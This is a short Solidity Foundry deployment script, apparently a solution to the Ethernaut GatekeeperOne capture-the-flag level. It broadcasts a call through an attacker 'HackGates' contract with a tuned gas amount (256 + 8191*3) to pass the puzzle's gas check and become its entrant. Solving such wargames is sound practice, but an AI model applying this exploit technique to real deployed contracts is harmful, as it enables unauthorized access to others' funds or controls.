// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/HackGates.sol";

contract DeployHack is Script {
    address player = <player address>;

    function run() public returns (bool success) {
        success = false;

        vm.startBroadcast(player);

        HackGates hack = HackGates(<attacker contract>);
        GatekeeperOne gates = hack.gates();

        vm.label(player, "Player");
        vm.label(address(gates), "GateKeeperOne");
        vm.label(address(hack), "Hack");

        try hack.hackGate(256 + (8191 * 3)) {
            if (gates.entrant() == player) {
                success = true;
                console.log("Success!");
            } else {
                success = false;
                console.log("Fail entrant()");
            }
        } catch {
            success = false;
            console.log("Fail, gas: 256");
        }

        vm.stopBroadcast();

        console.log("Result : ", success);
    }
}
